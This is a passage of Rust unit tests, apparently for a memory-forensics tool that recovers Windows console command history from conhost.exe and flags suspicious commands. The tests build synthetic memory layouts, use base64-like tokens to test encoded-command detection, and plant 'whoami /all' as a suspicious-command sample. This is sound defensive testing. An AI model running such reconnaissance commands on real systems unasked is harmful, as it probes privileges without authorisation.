        let list_head: u64 = 0x0070_0000;
        let entry_a: u64 = 0x0071_0000;

        let mut head_page = vec![0u8; 0x1000];
        head_page[0..8].copy_from_slice(&entry_a.to_le_bytes()); // Flink → entry_a

        let mut page_a = vec![0u8; 0x1000];
        page_a[0..8].copy_from_slice(&0u64.to_le_bytes()); // Flink = null → stop

        let isf = IsfBuilder::new().add_struct("_PEB", 0x100).build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(list_head, list_head, flags::WRITABLE)
            .write_phys(list_head, &head_page)
            .map_4k(entry_a, entry_a, flags::WRITABLE)
            .write_phys(entry_a, &page_a)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        let entries = walk_history_list(&reader, list_head, 0);
        assert_eq!(entries.len(), 1, "null Flink should stop after 1 entry");
    }

    /// scan_for_console_info returns empty when the heap area cannot be read.
    #[test]
    fn scan_for_console_info_unreadable_heap_returns_empty() {
        let reader = make_minimal_reader();
        let found = scan_for_console_info(&reader, 0xDEAD_BEEF_0000, 0x40);
        assert!(found.is_empty());
    }

    /// scan_for_console_info returns empty when hist_off + 16 > data.len().
    #[test]
    fn scan_for_console_info_hist_off_too_large_returns_empty() {
        let vaddr: u64 = 0x0080_0000;
        let paddr: u64 = 0x0080_0000;
        // Write just 8 bytes — any hist_list_off >= 0 will fail the check
        // when hist_off + 16 > 8.
        let page_data = vec![0xFFu8; 8];

        let isf = IsfBuilder::new().add_struct("_PEB", 0x100).build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(vaddr, paddr, flags::WRITABLE)
            .write_phys(paddr, &page_data)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        // hist_list_off = 0, but SCAN_WINDOW_SIZE = 512KB — read_bytes will only
        // return 8 bytes (or fail). Either way hist_off + 16 = 16 > 8 → empty.
        let found = scan_for_console_info(&reader, vaddr, 0);
        assert!(found.is_empty(), "hist_off + 16 > data.len() should return empty");
    }

    // ---------------------------------------------------------------
    // extract_console_commands coverage
    // ---------------------------------------------------------------

    /// extract_console_commands returns empty when peb_addr == 0.
    #[test]
    fn extract_console_commands_peb_zero_returns_empty() {
        let reader = make_minimal_reader();
        let result = extract_console_commands(&reader, 1, "conhost.exe", 0).unwrap();
        assert!(result.is_empty(), "peb_addr == 0 should return empty");
    }

    /// extract_console_commands returns empty when heap_addr (ProcessHeap) == 0.
    /// We map a PEB page with ProcessHeap = 0 at the expected field offset.
    #[test]
    fn extract_console_commands_heap_zero_returns_empty() {
        let peb_addr: u64 = 0x0090_0000;
        let peb_paddr: u64 = 0x0090_0000;

        // ProcessHeap at PEB+0x30 = 0
        let peb_page = vec![0u8; 0x1000]; // all zeros → ProcessHeap = 0

        let isf = IsfBuilder::new()
            .add_struct("_PEB", 0x400)
            .add_field("_PEB", "ProcessHeap", 0x30, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(peb_addr, peb_paddr, flags::WRITABLE)
            .write_phys(peb_paddr, &peb_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        let result = extract_console_commands(&reader, 1, "conhost.exe", peb_addr).unwrap();
        assert!(result.is_empty(), "ProcessHeap == 0 should return empty");
    }

    /// extract_console_commands: non-zero PEB and heap, but heap is not mappable
    /// for scan → scan_for_console_info returns empty → extract returns empty.
    #[test]
    fn extract_console_commands_unmapped_heap_returns_empty() {
        let peb_addr: u64 = 0x00A0_0000;
        let peb_paddr: u64 = 0x00A0_0000;

        // Non-zero but unmapped heap pointer (page not present).
        let heap_ptr: u64 = 0xDEAD_CAFE_0000u64;

        let mut peb_page = vec![0u8; 0x1000];
        peb_page[0x30..0x38].copy_from_slice(&heap_ptr.to_le_bytes());

        let isf = IsfBuilder::new()
            .add_struct("_PEB", 0x400)
            .add_field("_PEB", "ProcessHeap", 0x30, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(peb_addr, peb_paddr, flags::WRITABLE)
            .write_phys(peb_paddr, &peb_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        // heap_ptr is not mapped → scan_for_console_info returns empty → no commands.
        let result = extract_console_commands(&reader, 1, "conhost.exe", peb_addr).unwrap();
        assert!(result.is_empty(), "unmapped heap should yield no commands");
    }

    // ---------------------------------------------------------------
    // Additional classify_console_command edge cases
    // ---------------------------------------------------------------

    /// Token with non-base64 char (backslash) is not flagged even if long.
    #[test]
    fn classify_long_token_with_backslash_benign() {
        // 90-char token containing backslash — not pure base64.
        let token: String = "a".repeat(40) + r"\" + &"b".repeat(49);
        assert!(!classify_console_command(&token));
    }

    /// Token with '+' and '/' characters is base64-like when >80 chars.
    #[test]
    fn classify_base64_with_plus_slash_suspicious() {
        // Alternate '+' and '/' in a >80-char token
        let token: String = (0..81).map(|i| if i % 2 == 0 { '+' } else { '/' }).collect();
        let cmd = format!("run {}", token);
        assert!(classify_console_command(&cmd));
    }

    /// Token with '=' padding characters is base64-like when >80 chars.
    #[test]
    fn classify_base64_with_equals_suspicious() {
        let token: String = "A".repeat(79) + "==";
        let cmd = format!("run {}", token);
        assert!(classify_console_command(&cmd));
    }

    // ---------------------------------------------------------------
    // walk_consoles: process loop body coverage
    // ---------------------------------------------------------------

    /// walk_consoles: "conhost.exe" process with peb_addr=0 → process is skipped.
    /// Exercises the cr3==0||peb_addr==0 guard (line 136-138).
    ///
    /// Process layout: single conhost.exe EPROCESS with peb=0 in circular list.
    #[test]
    fn walk_consoles_conhost_no_peb_skipped() {
        let ps_head_vaddr: u64 = 0xFFFF_8005_0000_0000;
        let ps_head_paddr: u64 = 0x0030_0000;
        let eproc_vaddr: u64   = 0xFFFF_8005_0100_0000;
        let eproc_paddr: u64   = 0x0031_0000;

        let mut ps_head_page = vec![0u8; 4096];
        ps_head_page[0..8].copy_from_slice(&(eproc_vaddr + 0x448).to_le_bytes());

        let mut eproc_page = vec![0u8; 4096];
        eproc_page[0x448..0x450].copy_from_slice(&ps_head_vaddr.to_le_bytes());
        eproc_page[0x440..0x448].copy_from_slice(&100u64.to_le_bytes()); // PID
        eproc_page[0x540..0x548].copy_from_slice(&0u64.to_le_bytes());   // PPID
        // ImageFileName = "conhost.exe\0"
        let name = b"conhost.exe\0";
        eproc_page[0x5A8..0x5A8 + name.len()].copy_from_slice(name);
        // peb_addr = 0 → process skipped
        eproc_page[0x550..0x558].copy_from_slice(&0u64.to_le_bytes());
        // cr3 = some value (doesn't matter since peb=0)
        eproc_page[0x28..0x30].copy_from_slice(&eproc_paddr.to_le_bytes());

        let isf = IsfBuilder::windows_kernel_preset()
            .add_symbol("PsActiveProcessHead", ps_head_vaddr)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(ps_head_vaddr, ps_head_paddr, flags::WRITABLE)
            .write_phys(ps_head_paddr, &ps_head_page)
            .map_4k(eproc_vaddr, eproc_paddr, flags::WRITABLE)
            .write_phys(eproc_paddr, &eproc_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        // conhost.exe with peb=0 → skipped → empty result
        let results = walk_consoles(&reader).unwrap();
        assert!(
            results.is_empty(),
            "conhost.exe with peb=0 should be skipped: got {}",
            results.len()
        );
    }

    // ---------------------------------------------------------------
    // scan_for_console_info: exercise the self-consistency check
    // ---------------------------------------------------------------

    /// scan_for_console_info finds a candidate when flink→blink == head_addr.
    ///
    /// Layout (all in one 4K page at base_addr):
    ///   hist_list_off = 0x40
    ///   base_addr + 0: potential _CONSOLE_INFORMATION candidate
    ///     + 0x40: HistoryList Flink = flink_addr (= base_addr + 0x300)
    ///     + 0x48: HistoryList Blink = some_blink (= flink_addr)
    ///   flink_addr = base_addr + 0x300:
    ///     + 0x08: Blink = head_addr (= base_addr + 0x40)  ← self-consistency check
    ///
    /// With hist_list_off=0x40:
    ///   candidate_addr = base_addr + 0 (offset=0 in scan)
    ///   head_addr = candidate_addr + 0x40 = base_addr + 0x40
    ///   flink = page[0x40..0x48] = base_addr + 0x300 (plausible user-mode pointer)
    ///   blink = page[0x48..0x50] = flink (non-null, plausible)
    ///   flink_blink = page at flink+8 = base_addr + 0x308 = head_addr ✓ → candidate found.
    #[test]
    fn scan_for_console_info_finds_candidate_with_valid_list() {
        // base_addr must be a user-mode address (< 0x0000_8000_0000_0000) so pointers
        // are plausible (is_plausible_pointer checks upper >> 47 == 0 or 0x1FFFF).
        let base_addr: u64 = 0x0001_0000;
        let base_paddr: u64 = 0x0001_0000;
        let hist_list_off: u64 = 0x40;

        // flink_addr must be a plausible user-mode pointer.
        let flink_addr: u64 = base_addr + 0x300; // within the same page
        let head_addr = base_addr.wrapping_add(hist_list_off); // = base_addr + 0x40

        let mut page = vec![0u8; 0x1000];

        // At offset 0 (candidate at base_addr+0):
        //   HistoryList.Flink at +0x40 = flink_addr
        //   HistoryList.Blink at +0x48 = flink_addr (non-null, plausible)
        page[0x40..0x48].copy_from_slice(&flink_addr.to_le_bytes());
        page[0x48..0x50].copy_from_slice(&flink_addr.to_le_bytes());

        // At flink_addr (base_addr+0x300):
        //   flink_addr + 8 = Blink = head_addr
        page[0x308..0x310].copy_from_slice(&head_addr.to_le_bytes());

        let isf = IsfBuilder::new().add_struct("_PEB", 0x100).build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(base_addr, base_paddr, flags::WRITABLE)
            .write_phys(base_paddr, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        let found = scan_for_console_info(&reader, base_addr, hist_list_off);
        assert!(
            !found.is_empty(),
            "should find at least one candidate with valid self-consistent list"
        );
        // The candidate should be base_addr + 0 = base_addr.
        assert!(
            found.contains(&base_addr),
            "candidate should be base_addr: found {:?}", found
        );
    }

    // ---------------------------------------------------------------
    // extract_console_commands: full command extraction path
    // ---------------------------------------------------------------

    /// extract_console_commands: full path through scan → history → command.
    ///
    /// Memory layout (single physical page for everything):
    ///   hist_list_off = 0x40 (default from unwrap_or)
    ///   PEB at peb_vaddr with ProcessHeap = heap_vaddr
    ///   heap_vaddr = base_addr (user-mode address for scan)
    ///
    ///   Scan finds candidate at heap_vaddr+0:
    ///     HistoryList.Flink at +0x40 = hist_entry_addr
    ///     HistoryList.Blink at +0x48 = hist_entry_addr
    ///   hist_entry_addr: flink at +8 = head_addr (self-consistency)
    ///
    ///   History entry (cmd_hist_list_off=0, so hist_addr = hist_entry_addr):
    ///     Application (_UNICODE_STRING) at +cmd_hist_app_off = +0x10:
    ///       Length=14 at +0x10, MaxLength=14 at +0x12, Buffer=app_name_vaddr at +0x18
    ///     CommandCount at +cmd_hist_count_off = +0x20: 1
    ///     CommandBucket at +cmd_hist_buf_off = +0x28: bucket_ptr
    ///
    ///   bucket_ptr: pointer to cmd_entry_addr
    ///   cmd_entry_addr:
    ///     CommandLength at +cmd_entry_size_off = +0x00: 16 (bytes of UTF-16LE "whoami /all")
    ///     Command at +cmd_entry_data_off = +0x08: UTF-16LE "whoami /all"
    ///
    ///   app_name_vaddr: UTF-16LE "cmd.exe"
    ///
    /// "whoami /all" contains "whoami" → is_suspicious = true.
    #[test]
    fn extract_console_commands_full_path_finds_suspicious_command() {
        // All addresses are user-mode (< 0x0000_8000_0000_0000) so pointers pass
        // is_plausible_pointer check.
        let base_paddr: u64    = 0x0050_0000;
        let base_vaddr: u64    = 0x0050_0000; // user-mode
        let peb_paddr: u64     = 0x0051_0000;
        let peb_vaddr: u64     = 0x0051_0000;

        // Layout within base_page (all offsets within 4K):
        let hist_list_off: u64 = 0x40; // default from extract_console_commands
        let cmd_hist_app_off: u64 = 0x10;
        let cmd_hist_count_off: u64 = 0x20;
        let cmd_hist_buf_off: u64 = 0x28;
        let cmd_entry_size_off: u64 = 0x00;
        let cmd_entry_data_off: u64 = 0x08;

        let hist_entry_addr: u64 = base_vaddr + 0x200; // _COMMAND_HISTORY at +0x200
        let head_addr = base_vaddr.wrapping_add(hist_list_off); // base+0x40

        // app_name: UTF-16LE "cmd.exe" (7 chars = 14 bytes)
        let app_name_utf16: Vec<u8> = "cmd.exe".encode_utf16().flat_map(u16::to_le_bytes).collect();
        let app_name_addr: u64 = base_vaddr + 0x500;

        // cmd entry at base+0x400, bucket ptr (u64) at base+0x380
        let cmd_entry_addr: u64 = base_vaddr + 0x400;
        let bucket_ptr_addr: u64 = base_vaddr + 0x380; // pointer to array of cmd ptrs

        // "whoami /all" in UTF-16LE (11 chars = 22 bytes)
        let cmd_text = "whoami /all";
        let cmd_utf16: Vec<u8> = cmd_text.encode_utf16().flat_map(u16::to_le_bytes).collect();
        let cmd_byte_len = cmd_utf16.len() as u16; // 22

        let mut page = vec![0u8; 0x1000];

        // Scan candidate at base+0: HistoryList.{Flink,Blink} = hist_entry_addr
        page[0x40..0x48].copy_from_slice(&hist_entry_addr.to_le_bytes()); // Flink
        page[0x48..0x50].copy_from_slice(&hist_entry_addr.to_le_bytes()); // Blink
        // flink→blink = head_addr (for self-consistency check)
        // hist_entry_addr is at base+0x200, so flink+8 is at base+0x208
        page[0x208..0x210].copy_from_slice(&head_addr.to_le_bytes()); // flink_blink

        // History entry at base+0x200:
        //   [+0x00] Flink = 0 (end of history list, next read_ptr returns 0)
        // Actually walk_history_list reads Flink from current (=hist_entry_addr).
        // hist_entry_addr+0 = Flink for the _LIST_ENTRY embedded in _COMMAND_HISTORY.
        // To terminate: flink should point to list_head (= head_addr) or 0.
        // If flink == list_head, walk terminates. Set flink = head_addr.
        page[0x200..0x208].copy_from_slice(&head_addr.to_le_bytes()); // Flink → head (terminates)

        // Application _UNICODE_STRING at hist_entry+cmd_hist_app_off = base+0x210:
        // Length=14 at +0, MaxLength=14 at +2, Buffer=app_name_addr at +8
        let app_len = app_name_utf16.len() as u16;
        page[0x210..0x212].copy_from_slice(&app_len.to_le_bytes()); // Length
        page[0x212..0x214].copy_from_slice(&app_len.to_le_bytes()); // MaxLength
        page[0x218..0x220].copy_from_slice(&app_name_addr.to_le_bytes()); // Buffer

        // CommandCount at hist_entry+cmd_hist_count_off = base+0x220: 1
        page[0x220..0x224].copy_from_slice(&1u32.to_le_bytes());

        // CommandBucket at hist_entry+cmd_hist_buf_off = base+0x228: bucket_ptr_addr
        page[0x228..0x230].copy_from_slice(&bucket_ptr_addr.to_le_bytes());

        // Bucket array at base+0x380: one u64 pointer → cmd_entry_addr
        page[0x380..0x388].copy_from_slice(&cmd_entry_addr.to_le_bytes());

        // Command entry at base+0x400:
        //   CommandLength at +0x00: cmd_byte_len (22)
        //   Command at +0x08: UTF-16LE "whoami /all"
        page[0x400..0x402].copy_from_slice(&cmd_byte_len.to_le_bytes());
        page[0x408..0x408 + cmd_utf16.len()].copy_from_slice(&cmd_utf16);

        // App name UTF-16LE "cmd.exe" at base+0x500
        page[0x500..0x500 + app_name_utf16.len()].copy_from_slice(&app_name_utf16);

        // PEB page: ProcessHeap = base_vaddr at +0x30
        let mut peb_page = vec![0u8; 0x1000];
        peb_page[0x30..0x38].copy_from_slice(&base_vaddr.to_le_bytes());

        let isf = IsfBuilder::new()
            .add_struct("_PEB", 0x400)
            .add_field("_PEB", "ProcessHeap", 0x30, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(base_vaddr, base_paddr, flags::WRITABLE)
            .write_phys(base_paddr, &page)
            .map_4k(peb_vaddr, peb_paddr, flags::WRITABLE)
            .write_phys(peb_paddr, &peb_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        let result = extract_console_commands(&reader, 42, "conhost.exe", peb_vaddr).unwrap();
        assert!(!result.is_empty(), "should extract at least one command");
        let cmd = &result[0];
        assert_eq!(cmd.pid, 42);
        assert_eq!(cmd.process_name, "conhost.exe");
        assert_eq!(cmd.command, cmd_text, "command text should match");
        assert!(cmd.is_suspicious, "whoami command should be suspicious");
    }

    /// walk_consoles: "conhost.exe" with non-zero peb and cr3, but ProcessHeap
    /// is zero (unmapped PEB) → extract_console_commands returns empty.
    /// Exercises lines 140-150 (reader.with_cr3, extract_console_commands call).
    #[test]
    fn walk_consoles_conhost_valid_peb_no_heap() {
        let ps_head_vaddr: u64 = 0xFFFF_8006_0000_0000;
        let ps_head_paddr: u64 = 0x0034_0000;
        let eproc_vaddr: u64   = 0xFFFF_8006_0100_0000;
        let eproc_paddr: u64   = 0x0035_0000;
        // PEB at a mapped address — but ProcessHeap will be 0
        let peb_vaddr: u64     = 0x0000_7FFF_0000_0000;
        let peb_paddr: u64     = 0x0036_0000;

        let mut ps_head_page = vec![0u8; 4096];
        ps_head_page[0..8].copy_from_slice(&(eproc_vaddr + 0x448).to_le_bytes());

        let mut eproc_page = vec![0u8; 4096];
        eproc_page[0x448..0x450].copy_from_slice(&ps_head_vaddr.to_le_bytes());
        eproc_page[0x440..0x448].copy_from_slice(&200u64.to_le_bytes()); // PID
        eproc_page[0x540..0x548].copy_from_slice(&0u64.to_le_bytes());   // PPID
        let name = b"conhost.exe\0";
        eproc_page[0x5A8..0x5A8 + name.len()].copy_from_slice(name);
        // non-zero peb_addr
        eproc_page[0x550..0x558].copy_from_slice(&peb_vaddr.to_le_bytes());
        // cr3 = ps_head_paddr (reuse as a valid paddr for the CR3 switch)
        eproc_page[0x28..0x30].copy_from_slice(&ps_head_paddr.to_le_bytes());

        // PEB page: ProcessHeap at +0x30 = 0 → extract_console_commands returns early
        let mut peb_page = vec![0u8; 4096];
        peb_page[0x30..0x38].copy_from_slice(&0u64.to_le_bytes()); // ProcessHeap = 0

        let isf = IsfBuilder::windows_kernel_preset()
            .add_symbol("PsActiveProcessHead", ps_head_vaddr)
            .add_struct("_PEB", 0x400)
            .add_field("_PEB", "ProcessHeap", 0x30, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(ps_head_vaddr, ps_head_paddr, flags::WRITABLE)
            .write_phys(ps_head_paddr, &ps_head_page)
            .map_4k(eproc_vaddr, eproc_paddr, flags::WRITABLE)
            .write_phys(eproc_paddr, &eproc_page)
            .map_4k(peb_vaddr, peb_paddr, flags::WRITABLE)
            .write_phys(peb_paddr, &peb_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader: ObjectReader<SyntheticPhysMem> = ObjectReader::new(vas, Box::new(resolver));

        let results = walk_consoles(&reader).unwrap();
        assert!(
            results.is_empty(),
            "conhost.exe with zero ProcessHeap should yield empty: got {}",
            results.len()
        );
    }
}
